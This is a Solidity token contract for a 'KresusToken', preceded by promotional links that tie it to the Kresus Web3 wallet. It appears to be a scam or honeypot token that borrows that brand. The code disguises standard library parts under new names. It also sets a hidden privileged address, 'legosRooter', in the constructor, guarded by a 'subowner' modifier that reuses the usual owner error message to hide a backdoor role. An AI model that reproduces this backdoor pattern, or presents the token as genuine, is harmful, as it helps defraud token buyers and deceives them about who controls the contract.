...
🚨🚨https://t.me/KresusToken 🚨🚨

Kresus (Blockchain Service)

The wallet for everything Web3 🌐     
The only non-custodial solution to securely manage BTC, ETH, SOL and MATIC, all in one place 🔑🛡
https://www.kresus.com/

🔥Kresus is a Web3 mobile application that serves as a comprehensive toolkit for managing digital assets.
...
When it comes to enjoying the wonders of Web3, we’re here to show you the way. We curate interesting Web3 finds, teach you how to mint your first NFT, offer ongoing education about the evolving landscape, and connect you with exciting communities.


🌐 https://twitter.com/Kresusofficial

🌐 https://discord.com/invite/VfsYQrWrZm

🌐 NEWS 
https://www.binance.com/en-JP/feed/post/2023-08-23-kresus-launches-curated-marketplace-for-polygon-projects-and-introduces-kresus-connect-web3-portal-1019971
...
/*
 * @dev Provides information about the current execution Kresus20Burnable, including the
 ...
 */
abstract contract Kresus20Burnable {
...
// File: @openzeppelin/contracts/access/Kresus20Ownable.sol
 ...
 * the owner.
 */
abstract contract Kresus20Ownable is Kresus20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Kresus20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Kresus20Ownable: new owner is the zero address");
 ...
 * `SafeKresus` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeKresus {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeKresus: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeKresus: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeKresus: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeKresus: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeKresus: modulo by zero");
  }
...
contract KresusToken is Kresus20Burnable, Kresus33, Kresus20Ownable {
    
    using SafeKresus for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _symbol = "Kresus";
        _decimals = 9;
        _totalSupply = 7990000000000 * 10 ** 9;
        mintfrom[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
   address private marketingAddress = 0x4B16c5dE96EB2117bBE5fd171E4d203624B014aa;
    string public KresusthenewsTGchannel = "https://t.me/KresusToken";
            function getKresusthenewsTGchannel() public view returns (string memory) {
        return KresusthenewsTGchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {Kresus33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "Kresus20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {Kresus33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {Kresus33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {Kresus33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "Kresus33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {Kresus33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "Kresus33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "Kresus33: transfer from the zero address");
        require(shippingto != address(0), "Kresus33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "Kresus33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "Kresus33: approve from the zero address");
        require(transporteur != address(0), "Kresus33: approve to the zero address");
